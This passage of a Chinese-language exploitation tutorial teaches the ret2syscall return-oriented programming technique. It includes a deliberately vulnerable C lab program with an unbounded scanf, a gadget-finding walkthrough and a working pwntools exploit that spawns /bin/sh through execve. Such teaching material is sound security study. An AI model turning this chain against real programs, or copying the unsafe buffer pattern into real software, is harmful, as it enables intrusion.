alt=04f861564255fd35278467fc20a8b9d0></p><p>大概来解释这幅图，首先当执行到函数的ret指令时，ret会跳转到当前栈顶指向的代码处执行，并将当前栈顶移动到下一个栈单元，这里我们将其覆盖成了修改参数寄存器代码片段的地址，接下来一段时间都会去执行修改参数寄存器的操作，直到执行到代码片段的ret指令，对于这条ret指令来说其跳转的地址就是图中第一条虚线即修改ax寄存器的代码片段的地址（应为当前栈顶就是该栈单元），接着就会去执行修改ax寄存器的代码，直到执行到其ret指令处，对于它的ret指令来说返回地址是第二条虚线即内陷指令地址，最后跳转执行内陷指令后即可获取到shell。当然实际情况可能会比这个复杂很多。</p><p>对于ret2syscall来说有几个代码片段是必须要有的，首先就是内陷指令片段，正常的程序一般不会有内陷指令，如果有内陷指令的题目大概路就是ret2syscall的方式去解决。其次就是控制ax寄存器的指令，只有控制了ax寄存器才可以设定我们想要的系统调用号。最后就是设定参数的代码片段，每个参数寄存器必须设置为指定的值，否则大概率都是执行失败。</p><p>我们以一个例子来说</p><pre><code class=language-c>#include&lt;stdio.h&gt;
char *bin_sh = &quot;/bin/sh&quot;;
void hint();
asm(
    &quot;.text\n&quot;
    &quot;.global hint\n&quot;
    &quot;hint:\n&quot;
    &quot;inc eax\n&quot;
    &quot;ret\n&quot;
    &quot;xor eax, eax\n&quot;
    &quot;xor ebx, ebx\n&quot;
    &quot;xor ecx, ecx\n&quot;
    &quot;xor edx, edx\n&quot;
    &quot;ret\n&quot;
    &quot;int 0x80&quot;
);

void run() {
    char buf[0x10];
    printf(&quot;input: &quot;);
    scanf(&quot;%s&quot;, buf);
}

int main() {
    run();
    return 0;
}
// gcc ret2syscall.c -o ret2syscall -no-pie -fno-pic -fno-stack-protector -m32 -masm=intel
</code></pre><p>这里我们以内联汇编的方式写了一些必要的代码片段以完成ret2syscall的操作。在ret2syscall中获取shell的系统调用只有一种即 <code>execve</code> 系统调用，它的作用就是执行一个新的程序。execve接收三个参数，第一个参数是程序名称，第二个参数是给程序的参数，第三个参数是环境参数，对于shell来说只需要第一个参数设置为 <code>/bin/sh</code> 即可，后两个为null即0就行。</p><p>首先是找到修改参数寄存器的代码片段，在上面的源文件中可以很明显看到有 <code>xor ecx, ecx; xor edx, edx</code> 这两条指令可以完成第二、三两个参数寄存器的设置。而对于第一个参数寄存器的设置则需要通过其他指令来完成，通常寻找的是 <code>pop ebx; ret</code> 代码片段，该代码片段会将当前栈顶的值弹出存入到ebx中并返回下一个栈单元，如果我们在栈顶存入 <code>/bin/sh</code> 字符串地址则可以直接完成第一个参数寄存器的设置</p><p><img class="img-fluid lazyload blur-up" src=https://c3n1gbr0k3n.github.io/images/232fb5b32f5452ad8a9d67414334b4c5.png alt=232fb5b32f5452ad8a9d67414334b4c5></p><p>所有的参数寄存器都执行完成后即可对ax寄存器进行设置，这里存在一个 <code>inc eax; ret</code> 代码片段，它可以对eax进行加一的操作，我们只要多次执行这个代码片段直到ax寄存器为execve系统调用号的值就行。最后既可以跳转去执行内陷指令获取shell了。所以整个的栈布局为</p><p><img class="img-fluid lazyload blur-up" src=https://c3n1gbr0k3n.github.io/images/04f411c8c99c68955cdbe5866de7210e.png alt=04f411c8c99c68955cdbe5866de7210e></p><p>建议可以调试看看具体的ROP链执行过程</p><p>然后我们需要找出这些代码片段的地址，这里可以使用 <code>ROPgadget</code> 工具来查找</p><p><img class="img-fluid lazyload blur-up" src=https://c3n1gbr0k3n.github.io/images/0bb4220de7d1cd13dbbce3991431580b.png alt=0bb4220de7d1cd13dbbce3991431580b></p><p><img class="img-fluid lazyload blur-up" src=https://c3n1gbr0k3n.github.io/images/55b4ddbfa236719c41cc04708c4239b8.png alt=55b4ddbfa236719c41cc04708c4239b8></p><p><img class="img-fluid lazyload blur-up" src=https://c3n1gbr0k3n.github.io/images/8748ec9f9380ccc2ff4d633953cc64c8.png alt=8748ec9f9380ccc2ff4d633953cc64c8></p><p><img class="img-fluid lazyload blur-up" src=https://c3n1gbr0k3n.github.io/images/b6936a41caea9de420af66aafac841ad.png alt=b6936a41caea9de420af66aafac841ad></p><p>而execve的系统调用号在文件中可以查到为 <code>11</code> ，通过调试我们可以知道当run函数执行到ret指令的时候eax寄存器的值为1。</p><p><img class="img-fluid lazyload blur-up" src=https://c3n1gbr0k3n.github.io/images/4bffa0dbc1505963a34132bb1f4b608b.png alt=4bffa0dbc1505963a34132bb1f4b608b></p><p>所以inc指令只需要执行10次即可。最终可以写出Exploit</p><pre><code class=language-python>from pwn import*
o = process(&quot;./ret2syscall&quot;)
bin_sh = 0x8048550    # /bin/sh字符串地址
pop_ebx = 0x8048311    # pop ebx;ret代码片段地址
xor_ret = 0x8048471    # xor ecx, ecx;xor edx, edx;ret代码片段地址
int_80 = 0x8048476    # int 0x80代码片段地址
inc_eax = 0x804846b    # inc eax;ret代码片段地址
payload = b'a'*28    # 填充局部变量和函数返回地址之间的空隙
payload += p32(pop_ebx) + p32(bin_sh)    # 设置第一个参数寄存器
payload += p32(xor_ret)    # 设置第二三个参数寄存器
payload += p32(inc_eax)*10   # eax累加到11
payload += p32(int_80)    # 执行系统调用
o.sendline(payload)
o.interactive()
</code></pre><p><img class="img-fluid lazyload blur-up" src=https://c3n1gbr0k3n.github.io/images/aa241111f472d5e8dc9d1eed30c466bc.png alt=aa241111f472d5e8dc9d1eed30c466bc></p><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="docs-navigation d-flex justify-content-between"><a href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2text/><div class="card my-1"><div class="card-body py-2">&larr; ret2text</div></div></a><a class=ms-auto href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2shellcode/><div class="card my-1"><div class="card-body py-2">ret2shellcode &rarr;</div></div></a></div></main></div></div></div><footer class="footer text-muted"><div class=container-xxl><div class=row><div class="col-lg-8 order-last order-lg-first"><ul class=list-inline><li class=list-inline-item>Written by c3n1gbr0k3n</li></ul></div><div class="col-lg-8 order-first order-lg-last text-lg-end"><ul class=list-inline></ul></div></div></div></footer><script src=https://c3n1gbr0k3n.github.io/js/bootstrap.min.650aeec64c81d69d4c0850fc73c93da3f0330cec0a27772feed7f90f60baa5f47f1c45687d71914bdafd1c4e860d40f6dc08ede27a2f08431ff929c9a2d24621.js integrity="sha512-ZQruxkyB1p1MCFD8c8k9o/AzDOwKJ3cv7tf5D2C6pfR/HEVofXGRS9r9HE6GDUD23Ajt4novCEMf+SnJotJGIQ==" crossorigin=anonymous defer></script>
<script src=https://c3n1gbr0k3n.github.io/js/highlight.min.a5eee34927239a22fbeae000257a46e9983ab5860c2401ddcdb32664d8e92accdb1b58a4ced97109bc642ef870a90fd4b4e916f4f98205a6008bd257ad49e9a4.js integrity="sha512-pe7jSScjmiL76uAAJXpG6Zg6tYYMJAHdzbMmZNjpKszbG1ikztlxCbxkLvhwqQ/UtOkW9PmCBaYAi9JXrUnppA==" crossorigin=anonymous defer></script>
<script src=https://c3n1gbr0k3n.github.io/main.min.cb2e2ebbf2e4002f3117addc33582923b2b3ae5265c22944cd117ebec7abe61c170417c4506d7a0f8f0fc9053dfdf441421d53601ac467042ff3d06ec0ba07fa.js integrity="sha512-yy4uu/LkAC8xF63cM1gpI7KzrlJlwilEzRF+vser5hwXBBfEUG16D48PyQU9/fRBQh1TYBrEZwQv89BuwLoH+g==" crossorigin=anonymous defer></script>
<script src=https://c3n1gbr0k3n.github.io/index.min.6a3c29a11ac8841b6e3a82c73c13a8d2db3c51b8ce5a32154321c397f73ccf7cfdbe65b375955c255f9cae77a1a57ac8b216e54333c70303dabe4240710436f6.js integrity="sha512-ajwpoRrIhBtuOoLHPBOo0ts8UbjOWjIVQyHDl/c8z3z9vmWzdZVcJV+crnehpXrIshblQzPHAwPavkJAcQQ29g==" crossorigin=anonymous defer></script></body></html>